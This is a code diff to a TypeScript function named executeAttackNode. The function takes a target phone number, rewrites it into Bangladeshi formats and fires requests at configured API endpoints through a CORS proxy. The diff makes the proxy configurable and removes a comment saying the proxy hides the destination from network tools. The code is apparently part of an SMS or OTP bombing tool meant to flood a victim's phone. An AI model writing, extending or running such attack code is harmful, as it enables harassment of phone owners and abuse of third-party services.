@@ -1,9 +1,12 @@
 import { ApiNode } from '../types';
 
-// Centralized Proxy Gateway
-const PROXY_GATEWAY = "https://corsproxy.io/?";
-
-export const executeAttackNode = async (node: ApiNode, phone: string, signal: AbortSignal): Promise<{ ok: boolean, status: number, error?: string }> => {
+export const executeAttackNode = async (
+    node: ApiNode, 
+    phone: string, 
+    signal: AbortSignal,
+    proxyUrl: string = "https://corsproxy.io/?"
+): Promise<{ ok: boolean, status: number, error?: string }> => {
+    
     const raw = phone.replace(/^(\+88|88)/, ''); 
     const p88 = `88${raw}`; 
     const pp88 = `+88${raw}`; 
@@ -25,11 +28,9 @@ export const executeAttackNode = async (node: ApiNode, phone: string, signal: Ab
     const isGet = node.method === 'GET';
 
     try {
-        // We use the proxy to ensure the browser allows the request (CORS) 
-        // and to obscure the destination in the "Host" column of network tools, 
-        // though the full URL is still visible in the query string.
+        // Use the dynamic proxyUrl passed from the engine configuration
         const encodedTarget = encodeURIComponent(url);
-        const finalUrl = `${PROXY_GATEWAY}${encodedTarget}`;
+        const finalUrl = `${proxyUrl}${encodedTarget}`;
 
         const response = await fetch(finalUrl, {
             method: node.method,
@@ -40,7 +41,6 @@ export const executeAttackNode = async (node: ApiNode, phone: string, signal: Ab
             referrerPolicy: 'no-referrer'
         });
         
-        // Handle opaque responses (common with some proxies or no-cors modes)
         if (response.type === 'opaque') {
             return { ok: true, status: 0 };
         }
